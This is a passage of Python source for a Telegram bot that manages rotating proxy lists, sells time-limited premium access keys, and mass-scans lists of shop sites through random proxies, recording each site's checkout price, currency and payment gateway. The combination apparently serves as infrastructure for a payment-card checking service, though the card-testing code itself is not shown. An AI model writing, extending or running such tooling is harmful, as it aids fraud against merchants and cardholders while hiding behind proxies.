            await bot.edit_message(user_id, status_msg.id, premium_emoji(f"🔄 [{i}/{len(proxies_to_add)}] | ✅ AƖιvε: {len(alive_proxies)} | ❌ Dεαd: {len(dead_proxies)}"), parse_mode='html')
        if proxy in current_proxies:
            already_exists.append(proxy)
            continue
        result = await test_proxy(proxy)
        if result['status'] == 'alive':
            alive_proxies.append(proxy)
            add_user_proxy(user_id, proxy)
        else:
            dead_proxies.append(proxy)
    total_proxies = get_user_proxy_count(user_id)
    result_text = f"""🚀 Pɾσxy Cнεcκ CσмρƖεтεd!
📠 RεsυƖтs:
   ├─ ✅ AƖιvε: {len(alive_proxies)}
   ├─ ❌ Dεαd: {len(dead_proxies)}
   ├─ ⚠️ Exιsтιηg: {len(already_exists)}
   └─ 📠 TσταƖ ιη Ɩιsт: {total_proxies}"""
    if alive_proxies:
        result_text += f"\n\n✅ A∂∂εd Pɾσxιεs:\n"
        for p in alive_proxies[:5]:
            result_text += f"   • <code>{p}</code>\n"
        if len(alive_proxies) > 5:
            result_text += f"   ... αηd {len(alive_proxies) - 5} мσяε\n"
    if dead_proxies:
        result_text += f"\n⚠️ Dεαd Pɾσxιεs ({len(dead_proxies)}):"
        for p in dead_proxies[:3]:
            result_text += f"\n   • <code>{p}</code>"
        if len(dead_proxies) > 3:
            result_text += f"\n   ... αηd {len(dead_proxies) - 3} мσяε"
    await bot.edit_message(user_id, status_msg.id, premium_emoji(result_text), parse_mode='html')

# ==================== باقي الأوامر ====================

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("🔨 Yσυ αɾε BANNED!"), parse_mode='html')
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.reply(premium_emoji("❌ Nσ ρɾσxιεs ƒσυnd ιη yσυɾ Ɩιsт.\n\n📝 Usε /αddρɾσxy τσ αdd ρɾσxιεs."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔄 Cнεcκιηg {len(proxies)} ρɾσxιεs...\n⏳ Tнιs мαу тαкε α ƒεw мσмεηтs"), parse_mode='html')
    alive_proxies = []
    dead_proxies = []
    for i, proxy in enumerate(proxies, 1):
        await bot.edit_message(user_id, status_msg.id, premium_emoji(f"🔄 Tεsтιηg [{i}/{len(proxies)}]: <code>{proxy[:30]}...</code>"), parse_mode='html')
        result = await test_proxy(proxy)
        if result['status'] == 'alive':
            alive_proxies.append(proxy)
        else:
            dead_proxies.append(proxy)
        if i % 10 == 0 or i == len(proxies):
            await bot.edit_message(user_id, status_msg.id, premium_emoji(f"🔄 Tεsтιηg [{i}/{len(proxies)}]\n\n✅ AƖιvε: {len(alive_proxies)}\n❌ Dεαd: {len(dead_proxies)}"), parse_mode='html')
        await asyncio.sleep(0.3)
    save_user_proxies(user_id, alive_proxies)
    result_text = f"""✅ Pɾσxy Cнεcκ CσмρƖεтεd!
📠 RεsυƖтs:
   ├─ ✅ AƖιvε (Kερт): {len(alive_proxies)}
   ├─ ❌ Dεαd (Rεмσvεd): {len(dead_proxies)}
   └─ 📠 TσταƖ ιη yσυɾ Ɩιsт: {len(alive_proxies)}"""
    if alive_proxies:
        result_text += f"\n\n✅ Kερт Pɾσxιεs:"
        for p in alive_proxies[:5]:
            result_text += f"\n   • <code>{p}</code>"
        if len(alive_proxies) > 5:
            result_text += f"\n   ... αηd {len(alive_proxies) - 5} мσяε"
    await bot.edit_message(user_id, status_msg.id, premium_emoji(result_text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chkproxy'))
async def chkproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("🔨 Yσυ αɾε BANNED!"), parse_mode='html')
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) != 2:
        await event.reply(premium_emoji("📝 Usαgε: <code>/chkproxy ιρ:ρσrт:υsεr:ραss</code>"), parse_mode='html')
        return
    proxy = parts[1].strip()
    status_msg = await event.reply(premium_emoji(f"🔄 Cнεcκιηg ρɾσxy: <code>{proxy}</code>..."), parse_mode='html')
    start_time = time.time()
    result = await test_proxy(proxy)
    elapsed = round(time.time() - start_time, 2)
    if result['status'] == 'alive':
        ip_info = result.get('ip', 'Unknown')
        await bot.edit_message(user_id, status_msg.id, premium_emoji(f"""✅ Pɾσxy ιs <b>ALIVE</b>!
📌 Pɾσxy: <code>{proxy}</code>
🌐 IP: <code>{ip_info}</code>
⏱️ Rεsρσηsε Tιмε: <code>{elapsed}s</code>"""), parse_mode='html')
    else:
        await bot.edit_message(user_id, status_msg.id, premium_emoji(f"""❌ Pɾσxy ιs <b>DEAD</b>!
📌 Pɾσxy: <code>{proxy}</code>
⏱️ Rεsρσηsε Tιмε: <code>{elapsed}s</code>"""), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmproxy'))
async def rmproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("🔨 Yσυ αɾε BANNED!"), parse_mode='html')
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) != 2:
        await event.reply(premium_emoji("📝 Usαgε: <code>/rmproxy ιρ:ρσrт:υsεr:ραss</code>"), parse_mode='html')
        return
    proxy_to_remove = parts[1].strip()
    current_proxies = load_user_proxies(user_id)
    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Pɾσxy ησт ƒσυnd ιη yσυɾ Ɩιsт: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return
    if remove_user_proxy(user_id, proxy_to_remove):
        await event.reply(premium_emoji(f"✅ Pɾσxy rεмσvεd ƒrσm yσυr Ɩιsт!\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"❌ FαιƖεd тσ rεмσvε ρɾσxy."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmproxyindex'))
async def rmproxyindex_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("🔨 Yσυ αɾε BANNED!"), parse_mode='html')
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) != 2:
        await event.reply(premium_emoji("📝 Usαgε: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return
    try:
        indices = [int(i.strip()) - 1 for i in parts[1].split(',')]
        current_proxies = load_user_proxies(user_id)
        if not current_proxies:
            await event.reply(premium_emoji("❌ Nσ ρɾσxιεs ιη yσυɾ Ɩιsт."), parse_mode='html')
            return
        removed = []
        new_proxies = []
        for i, proxy in enumerate(current_proxies):
            if i in indices:
                removed.append(proxy)
            else:
                new_proxies.append(proxy)
        if not removed:
            await event.reply(premium_emoji("❌ Nσ ρɾσxιεs rεмσvεd."), parse_mode='html')
            return
        save_user_proxies(user_id, new_proxies)
        removed_text = "\n".join(removed[:10])
        await event.reply(premium_emoji(f"✅ Rεмσvεd {len(removed)} ρɾσxιεs ƒrσm yσυr Ɩιsт!\n\n{removed_text}"), parse_mode='html')
    except ValueError:
        await event.reply(premium_emoji("❌ IηvαƖιd ιηdιcεs! Usε: 1,2,3"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clearproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("🔨 Yσυ αɾε BANNED!"), parse_mode='html')
        return
    current_proxies = load_user_proxies(user_id)
    count = len(current_proxies)
    if count == 0:
        await event.reply(premium_emoji("❌ Yσυr ρɾσxy Ɩιsт ιs αƖrεα∂у εмρту."), parse_mode='html')
        return
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"
    with open(backup_filename, 'w') as f:
        for proxy in current_proxies:
            f.write(f"{proxy}\n")
    clear_user_proxies(user_id)
    await event.reply(premium_emoji(f"✅ CƖεαrεd αƖƖ {count} ρɾσxιεs ƒrσm yσυr Ɩιsт!\n\n💾 Bαcκυp sαvεd тσ: <code>{backup_filename}</code>"), parse_mode='html')
    os.remove(backup_filename)

@bot.on(events.NewMessage(pattern='/getproxy'))
async def getproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        await event.reply(premium_emoji("🔨 Yσυ αɾε BANNED!"), parse_mode='html')
        return
    current_proxies = load_user_proxies(user_id)
    if not current_proxies:
        await event.reply(premium_emoji("❌ Nσ ρɾσxιεs ιη yσυɾ Ɩιsт."), parse_mode='html')
        return
    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"📋 Yσυr Pɾσxιεs ({len(current_proxies)}):\n\n{proxy_list}"), parse_mode='html')
    else:
        filename = f"proxy_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                f.write(f"{i+1}. {proxy}\n")
        await bot.send_file(user_id, filename, caption=premium_emoji(f"📄 Yσυr Pɾσxιεs ({len(current_proxies)})"), parse_mode='html')
        os.remove(filename)

# ==================== أوامر الأدمن ====================

@bot.on(events.NewMessage(pattern='/addpremium'))
async def add_premium_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Accεss Dεnιεd!"), parse_mode='html')
        return
    parts = event.raw_text.split()
    if len(parts) != 2:
        await event.reply(premium_emoji("📝 Usαgε: <code>/addpremium usεr_id</code>"), parse_mode='html')
        return
    try:
        target_id = int(parts[1])
        if add_premium_user(target_id):
            await event.reply(premium_emoji(f"✅ Usεr <code>{target_id}</code> α∂∂εd тσ ρɾεмιυм!"), parse_mode='html')
        else:
            await event.reply(premium_emoji(f"⚠️ Usεr <code>{target_id}</code> ιs αƖrεα∂у ρɾεмιυм."), parse_mode='html')
    except:
        await event.reply(premium_emoji("❌ IηvαƖιd usεr ID."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/removepremium'))
async def remove_premium_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Accεss Dεnιεd!"), parse_mode='html')
        return
    parts = event.raw_text.split()
    if len(parts) != 2:
        await event.reply(premium_emoji("📝 Usαgε: <code>/removepremium usεr_id</code>"), parse_mode='html')
        return
    try:
        target_id = int(parts[1])
        if target_id in ADMIN_ID:
            await event.reply(premium_emoji("⚠️ Cαηησт rεмσvε α∂мιη ƒrσм ρɾεмιυм."), parse_mode='html')
            return
        if remove_premium_user(target_id):
            await event.reply(premium_emoji(f"✅ Usεr <code>{target_id}</code> rεмσvεd ƒrσм ρɾεмιυм."), parse_mode='html')
        else:
            await event.reply(premium_emoji(f"⚠️ Usεr <code>{target_id}</code> ιs ησт ρɾεмιυм."), parse_mode='html')
    except:
        await event.reply(premium_emoji("❌ IηvαƖιd usεr ID."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/listpremium'))
async def list_premium_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Accεss Dεnιεd!"), parse_mode='html')
        return
    premium_users = load_premium_users()
    if not premium_users:
        await event.reply(premium_emoji("📭 Nσ ρɾεмιυм υsεrs ƒσυnd."), parse_mode='html')
        return
    premium_list = "\n".join([f"• <code>{uid}</code>" for uid in premium_users])
    await event.reply(premium_emoji(f"⭐ <b>Pɾεмιυм Usεrs ({len(premium_users)})</b>\n\n{premium_list}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/genkeys'))
async def genkeys_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Accεss Dεnιεd!"), parse_mode='html')
        return
    parts = event.raw_text.split()
    if len(parts) != 4:
        await event.reply(premium_emoji("📝 Usαgε: <code>/genkeys αмσυηт нσυrs usεr_Ɩιмιт</code>"), parse_mode='html')
        return
    try:
        amount = int(parts[1])
        hours = int(parts[2])
        user_limit = int(parts[3])
        keys_data = load_keys()
        generated_keys = []
        created_at = datetime.now()
        for _ in range(amount):
            key = generate_key()
            expiry_time = created_at + timedelta(hours=hours)
            keys_data[key] = {
                'type': 'time_limit',
                'hours': hours,
                'expiry': expiry_time.isoformat(),
                'user_limit': user_limit,
                'used_count': 0,
                'used_by': [],
                'created_at': created_at.isoformat(),
                'created_by': user_id
            }
            generated_keys.append(key)
        save_keys(keys_data)
        days_display = f"{hours} нσυrs" if hours < 24 else f"{hours // 24} dαys"
        keys_text = "\n".join([f"├ <code>{k}</code>" for k in generated_keys])
        await event.reply(premium_emoji(f"""⭐ <b>Kεys Gεηεrαтεd</b> (x{amount})
────────────────────
{keys_text}
────────────────────
🔄 Pεrισd: {days_display}
👥 Usεrs: {user_limit}
✅ Usε /redeem Kεy тσ rεdεεм"""), parse_mode='html')
    except:
        await event.reply(premium_emoji("❌ IηvαƖιd αrgυмεnтs!"), parse_mode='html')

# ==================== أوامر الموقع ====================

@bot.on(events.NewMessage(pattern='/addsites'))
async def add_sites_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Accεss Dεnιεd!"), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("📝 PƖεαsε rερƖу тσ α .тxт ғιƖε cσηтαιηιηg sιтεs."), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ PƖεαsε rερƖу тσ α .тxт ғιƖε."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("🔄 Prσcεssιηg sιтεs..."), parse_mode='html')
    file_path = await reply_msg.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        sites = [line.strip() for line in content.splitlines() if line.strip()]
        if not sites:
            await bot.edit_message(user_id, status_msg.id, premium_emoji("❌ Nσ sιтεs ƒσυnd ιη ғιƖε."), parse_mode='html')
            if os.path.exists(file_path):
                os.remove(file_path)
            return
        proxies = load_proxies()
        if not proxies:
            await bot.edit_message(user_id, status_msg.id, premium_emoji("❌ Nσ ρɾσxιεs αvαιƖαвƖε тσ тεsт sιтεs."), parse_mode='html')
            if os.path.exists(file_path):
                os.remove(file_path)
            return
        alive_sites = []
        dead_sites = []
        sites_with_price = []
        for i, site in enumerate(sites):
            await bot.edit_message(user_id, status_msg.id, premium_emoji(f"🔄 Tεsтιηg [{i+1}/{len(sites)}]: {site}"), parse_mode='html')
            proxy = random.choice(proxies)
            result = await test_site_with_price(site, proxy)
            if result['status'] == 'alive':
                alive_sites.append(result['site'])
                sites_with_price.append({'url': result['site'], 'price': result.get('price', 0.0)})
            else:
                dead_sites.append(result['site'])
        with open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                f.write(f"{site}\n")
        save_sites_with_price(sites_with_price)
        result_text = f"""✅ <b>Sιтεs υρdαтεd!</b>
📠 TσταƖ: {len(sites)}
✅ AƖιvε: {len(alive_sites)}
❌ Dεαd: {len(dead_sites)}"""
        await bot.edit_message(user_id, status_msg.id, premium_emoji(result_text), parse_mode='html')
    except Exception as e:
        await bot.edit_message(user_id, status_msg.id, premium_emoji(f"❌ Eɾɾσɾ: {str(e)}"), parse_mode='html')
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Accεss Dεnιεd!"), parse_mode='html')
        return
    
    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ Nσ sιтεs ƒσυnd.\n\n📌 Usε /αddsιтεs тσ αdd sιтεs."), parse_mode='html')
        return
    
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ Nσ ρɾσxιεs αvαιƖαвƖε.\n\n📌 Usε /αddρɾσxy тσ αdd ρɾσxιεs."), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji(f"⚡ Scαηηιηg {len(sites)} sιтεs (Tυrвσ Mσdε)..."), parse_mode='html')
    
    alive_sites = []
    dead_sites = []
    sites_with_price = []
    total_price = 0
    price_count = 0
    
    semaphore = asyncio.Semaphore(10)
    
    async def check_one_site(site):
        async with semaphore:
            proxy = random.choice(proxies)
            result = await test_site_with_price(site, proxy)
            if result is None:
                return {'site': site, 'status': 'dead', 'price': 0.0, 'currency': 'USD', 'gateway': 'Unknown'}
            return result
    
    batch_size = 20
    total_batches = (len(sites) + batch_size - 1) // batch_size
    
    for batch_num in range(total_batches):
        start_idx = batch_num * batch_size
        end_idx = min(start_idx + batch_size, len(sites))
        batch = sites[start_idx:end_idx]
        
        tasks = [check_one_site(site) for site in batch]
        batch_results = await asyncio.gather(*tasks)
        
        for result in batch_results:
            if result is None:
                continue
            
            if result.get('status') == 'alive':
                site_url = result.get('site', '')
                if site_url:
                    alive_sites.append(site_url)
                    sites_with_price.append({
                        'url': site_url, 
                        'price': result.get('price', 0.0),
                        'currency': result.get('currency', 'USD'),
                        'gateway': result.get('gateway', 'Shopify')
                    })
                    if result.get('price', 0.0) > 0:
                        total_price += result.get('price', 0.0)
                        price_count += 1
            else:
                site_url = result.get('site', '')
                if site_url:
                    dead_sites.append(site_url)
        
        processed = end_idx
        percent = int((processed / len(sites)) * 100) if len(sites) > 0 else 0
        await bot.edit_message(
            user_id, 
            status_msg.id, 
            premium_emoji(f"⚡ [{processed}/{len(sites)}] {percent}%\n✅ {len(alive_sites)} AƖιvε | ❌ {len(dead_sites)} Dεαd"),
            parse_mode='html'
        )
        
        await asyncio.sleep(0.05)
    
    with open(SITES_FILE, 'w') as f:
        for site in alive_sites:
            f.write(f"{site}\n")
    
    save_sites_with_price(sites_with_price)
    
    avg_price = total_price / price_count if price_count > 0 else 0
    
    result_text = f"""⚡ <b>Sιтε Cнεcκ CσмρƖεтεd!</b>

📠 TσταƖ: {len(sites)}
✅ AƖιvε: {len(alive_sites)}
❌ Dεαd: {len(dead_sites)}
💰 Sιтεs ωιтᏂ ρɾιcε: {price_count}
📊 Avg Pɾιcε: ${avg_price:.2f}
⚡ Tυrвσ Mσdε: ON"""
    
    await bot.edit_message(user_id, status_msg.id, premium_emoji(result_text), parse_mode='html')

# ==================== أمر حالة الـ Workers ====================

@bot.on(events.NewMessage(pattern='/workers'))
async def workers_status_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Accεss Dεnιεd!"), parse_mode='html')
        return
    
    status = worker_manager.get_status()
    
    status_text = f"""⚡ <b>Wσякεяs Sтαтυs</b>

👷 Cυяяεηт Wσякεяs: <b>{status['current_workers']}</b>
📈 Mαx Wσякεяs: <b>{status['max_workers']}</b>
📉 Mιη Wσякεяs: <b>{status['min_workers']}</b>

💻 CPU Usαgε: <b>{status['cpu_percent']:.1f}%</b>
🧠 RAM Usαgε: <b>{status['memory_percent']:.1f}%</b>
✅ Sυccεss Rαтε: <b>{status['success_rate']:.1f}%</b>
⏱️ Avg Tαsк Tιмε: <b>{status['avg_task_time']:.2f}s</b>
📊 TσтαƖ Tαsкs: <b>{status['total_tasks']}</b>

⚡ Aυтσ A∂נυsт: <b>ON</b>"""
    
    await event.reply(premium_emoji(status_text), parse_mode='html')

# ==================== تشغيل البوت ====================
print("✅ Bσт sтαrтεd sυccεssғυƖƖу!")

async def main():
    asyncio.create_task(stars_payment_worker())
    asyncio.create_task(worker_manager.start_monitor())
    await bot.run_until_disconnected()

if __name__ == "__main__":
    try:
        bot.loop.run_until_complete(main())
    except KeyboardInterrupt:
        print("⏹️ Bσт sтσρρεd ву υsεr")
        worker_manager.shutdown()
    except Exception as e:
        print(f"❌ Eɾɾσɾ: {e}")
        worker_manager.shutdown()
